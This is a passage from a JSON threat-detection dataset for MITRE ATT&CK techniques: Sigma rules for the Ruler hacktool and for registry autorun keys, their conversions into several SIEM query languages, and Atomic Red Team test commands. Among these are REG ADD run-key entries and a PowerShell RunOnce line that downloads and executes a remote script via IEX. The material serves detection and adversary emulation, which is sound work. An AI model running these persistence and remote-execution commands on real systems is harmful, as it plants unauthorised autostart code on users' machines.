rule"}, {"query": "(EventID:(\"4776\" \"4624\" \"4625\") AND WorkstationName:\"RULER\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Hacktool-Use <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Hacktool Use\",\\n    \"description\": \"This method detects well-known keywords, certain field combination that appear in Windows Eventlog when certain hack tools are used\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.execution\",\\n      \"attack.t1087\",\\n      \"attack.t1075\",\\n      \"attack.t1114\",\\n      \"attack.t1059\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"4776\\\\\" \\\\\"4624\\\\\" \\\\\"4625\\\\\") AND WorkstationName:\\\\\"RULER\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4776\\\\\" \\\\\"4624\\\\\" \\\\\"4625\\\\\") AND WorkstationName:\\\\\"RULER\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Hacktool Use\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4776\" \"4624\" \"4625\") AND WorkstationName:\"RULER\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4776\" OR EventID=\"4624\" OR EventID=\"4625\") WorkstationName=\"RULER\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(EventID IN [\"4776\", \"4624\", \"4625\"] WorkstationName=\"RULER\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*4776|.*4624|.*4625))(?=.*RULER))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Hacktool Ruler\nid: 24549159-ac1b-479c-8175-d42aea947cae\ndescription: This events that are generated when using the hacktool Ruler by Sensepost\nauthor: Florian Roth\ndate: 2017/05/31\nmodified: 2019/07/26\nreferences:\n    - https://github.com/sensepost/ruler\n    - https://github.com/sensepost/ruler/issues/47\n    - https://github.com/staaldraad/go-ntlm/blob/master/ntlm/ntlmv1.go#L427\n    - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776\n    - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1087\n    - attack.t1075\n    - attack.t1114\n    - attack.t1059\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: \n          - 4776\n        Workstation: 'RULER'\n    selection2:\n        EventID:\n          - 4624\n          - 4625\n        WorkstationName: 'RULER'\n    condition: (1 of selection*)\nfalsepositives:\n    - Go utilities that use staaldraad awesome NTLM library\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Hacktool Ruler\nid: 24549159-ac1b-479c-8175-d42aea947cae\ndescription: This events that are generated when using the hacktool Ruler by Sensepost\nauthor: Florian Roth\ndate: 2017/05/31\nmodified: 2019/07/26\nreferences:\n    - https://github.com/sensepost/ruler\n    - https://github.com/sensepost/ruler/issues/47\n    - https://github.com/staaldraad/go-ntlm/blob/master/ntlm/ntlmv1.go#L427\n    - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776\n    - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1087\n    - attack.t1075\n    - attack.t1114\n    - attack.t1059\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: \n          - 4776\n        Workstation: 'RULER'\n    selection2:\n        EventID:\n          - 4624\n          - 4625\n        WorkstationName: 'RULER'\n    condition: (1 of selection*)\nfalsepositives:\n    - Go utilities that use staaldraad awesome NTLM library\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:(\"4776\") AND Workstation:\"RULER\") OR (EventID:(\"4624\" OR \"4625\") AND WorkstationName:\"RULER\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Hacktool-Ruler <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Hacktool Ruler\",\\n    \"description\": \"This events that are generated when using the hacktool Ruler by Sensepost\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.execution\",\\n      \"attack.t1087\",\\n      \"attack.t1075\",\\n      \"attack.t1114\",\\n      \"attack.t1059\"\\n    ],\\n    \"query\": \"((EventID:(\\\\\"4776\\\\\") AND Workstation:\\\\\"RULER\\\\\") OR (EventID:(\\\\\"4624\\\\\" OR \\\\\"4625\\\\\") AND WorkstationName:\\\\\"RULER\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:(\\\\\"4776\\\\\") AND Workstation:\\\\\"RULER\\\\\") OR (EventID:(\\\\\"4624\\\\\" OR \\\\\"4625\\\\\") AND WorkstationName:\\\\\"RULER\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Hacktool Ruler\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:(\"4776\") AND Workstation:\"RULER\") OR (EventID:(\"4624\" \"4625\") AND WorkstationName:\"RULER\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((EventID=\"4776\") Workstation=\"RULER\") OR ((EventID=\"4624\" OR EventID=\"4625\") WorkstationName=\"RULER\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" ((event_id IN [\"4776\"] Workstation=\"RULER\") OR (event_id IN [\"4624\", \"4625\"] WorkstationName=\"RULER\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*4776))(?=.*RULER))|.*(?:.*(?=.*(?:.*4624|.*4625))(?=.*RULER))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Command Line Execution with suspicious URL and AppData Strings\nid: 1ac8666b-046f-4201-8aba-1951aaec03a3\nstatus: experimental\ndescription: Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs\n    > powershell)\nreferences:\n    - https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100\n    - https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100\nauthor: Florian Roth\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - cmd.exe /c *http://*%AppData%\n            - cmd.exe /c *https://*%AppData%\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - High\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Command Line Execution with suspicious URL and AppData Strings\nid: 1ac8666b-046f-4201-8aba-1951aaec03a3\nstatus: experimental\ndescription: Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs\n    > powershell)\nreferences:\n    - https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100\n    - https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100\nauthor: Florian Roth\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - cmd.exe /c *http://*%AppData%\n            - cmd.exe /c *https://*%AppData%\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - High\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(cmd.exe\\\\ \\\\/c\\\\ *http\\\\:\\\\/\\\\/*%AppData% OR cmd.exe\\\\ \\\\/c\\\\ *https\\\\:\\\\/\\\\/*%AppData%)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Command-Line-Execution-with-suspicious-URL-and-AppData-Strings <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Command Line Execution with suspicious URL and AppData Strings\",\\n    \"description\": \"Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1059\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(cmd.exe\\\\\\\\ \\\\\\\\/c\\\\\\\\ *http\\\\\\\\:\\\\\\\\/\\\\\\\\/*%AppData% OR cmd.exe\\\\\\\\ \\\\\\\\/c\\\\\\\\ *https\\\\\\\\:\\\\\\\\/\\\\\\\\/*%AppData%)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(cmd.exe\\\\\\\\ \\\\\\\\/c\\\\\\\\ *http\\\\\\\\:\\\\\\\\/\\\\\\\\/*%AppData% OR cmd.exe\\\\\\\\ \\\\\\\\/c\\\\\\\\ *https\\\\\\\\:\\\\\\\\/\\\\\\\\/*%AppData%)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Command Line Execution with suspicious URL and AppData Strings\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(cmd.exe \\\\/c *http\\\\:\\\\/\\\\/*%AppData% cmd.exe \\\\/c *https\\\\:\\\\/\\\\/*%AppData%)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"cmd.exe /c *http://*%AppData%\" OR CommandLine=\"cmd.exe /c *https://*%AppData%\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"cmd.exe /c *http://*%AppData%\", \"cmd.exe /c *https://*%AppData%\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*cmd\\\\.exe /c .*http://.*%AppData%|.*cmd\\\\.exe /c .*https://.*%AppData%)'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1060/T1060.yaml", "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"\n", "name": null}, {"source": "atomics/T1060/T1060.yaml", "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"\n", "name": null}, {"source": "atomics/T1060/T1060.yaml", "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "name": null}, {"source": "atomics/T1060/T1060.yaml", "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nset-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "name": null}, {"source": "SysmonHunter - Registry Run Keys / Startup Folder", "command": "Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", "name": null}, {"source": "SysmonHunter - Registry Run Keys / Startup Folder", "command": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "name": null}, {"source": "SysmonHunter - Registry Run Keys / Startup Folder", "command": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/registry", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/registry", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/registry", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/registry", "name": "Empire Module Command"}], "command_list": ["REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"\n", "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"\n", "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nset-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "powershell/persistence/elevated/registry", "powershell/persistence/elevated/registry", "powershell/persistence/userland/registry", "powershell/persistence/userland/registry"], "technique_id": "T1060", "parsed_datasets": [{"Atomic Red Team Test - Registry Run Keys / Start Folder": {"display_name": "Registry Run Keys / Start Folder", "atomic_tests": [{"description": "Run Key Persistence\n", "supported_platforms": ["windows"], "name": "Reg Key Run", "input_arguments": {"command_to_execute": {"default": "C:\\Path\\AtomicRedTeam.exe", "type": "Path", "description": "Thing to Run"}}, "executor": {"command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"\n", "name": "command_prompt", "cleanup_command": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f\n"}}, {"description": "RunOnce Key Persistence\n", "supported_platforms": ["windows"], "name": "Reg Key RunOnce", "input_arguments": {"thing_to_execute": {"default": "C:\\Path\\AtomicRedTeam.dll", "type": "Path", "description": "Thing to Run"}}, "executor": {"command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n", "name": "command_prompt", "cleanup_command": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f\n"}}, {"description": "RunOnce Key Persistence via PowerShell\n", "supported_platforms": ["windows"], "name": "PowerShell Registry RunOnce", "input_arguments": {"thing_to_execute": {"default": "powershell.exe", "type": "Path", "description": "Thing to Run"}, "reg_key_path": {"default": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "type": "Path", "description": "Path to registry key to update"}}, "executor": {"elevation_required": true, "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n"}}], "attack_technique": "T1060"}}, {"SysmonHunter - T1060": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"}}}, {"process": {"cmdline": {"pattern": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"}}, "type": "process", "file": {"path": {"pattern": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"}}}, {"process": {"cmdline": {"pattern": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"}}, "type": "file", "file": {"path": {"pattern": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"}}}], "description": null, "name": "Registry Run Keys / Startup Folder", "level": "high"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1060", "Empire Module": "powershell/persistence/elevated/registry", "Technique": "Registry Run Keys / Start Folder", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/elevated/registry\":  [\"T1060\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1060", "Empire Module": "powershell/persistence/userland/registry", "Technique": "Registry Run Keys / Start Folder", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/userland/registry\":  [\"T1060\"],"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) and(registry_key_path contains \"*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*\"or registry_key_path contains \"*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\*Shell Folders\")", "product": "Azure Sentinel", "name": "Registry Run Keys Or Start Folder"}, {"query": "title: Autorun keys modification\nid: 17f878b8-9968-4578-b814-c4217fc5768c\ndescription: Detects modification of autostart extensibility point (ASEP) in registry\nstatus: experimental\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1060/T1060.yaml\ntags:\n    - attack.persistence\n    - attack.t1060\ndate: 2019/10/21\nmodified: 2019/11/10\nauthor: Victor Sergeev, Daniil Yugoslavskiy, oscd.community\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject|contains:\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Run'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunServices'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n    condition: selection\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Autorun keys modification\nid: 17f878b8-9968-4578-b814-c4217fc5768c\ndescription: Detects modification of autostart extensibility point (ASEP) in registry\nstatus: experimental\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1060/T1060.yaml\ntags:\n    - attack.persistence\n    - attack.t1060\ndate: 2019/10/21\nmodified: 2019/11/10\nauthor: Victor Sergeev, Daniil Yugoslavskiy, oscd.community\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject|contains:\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Run'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunServices'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n    condition: selection\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Windows* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\User\\\\ Shell\\\\ Folders*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Autorun-keys-modification <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Autorun keys modification\",\\n    \"description\": \"Detects modification 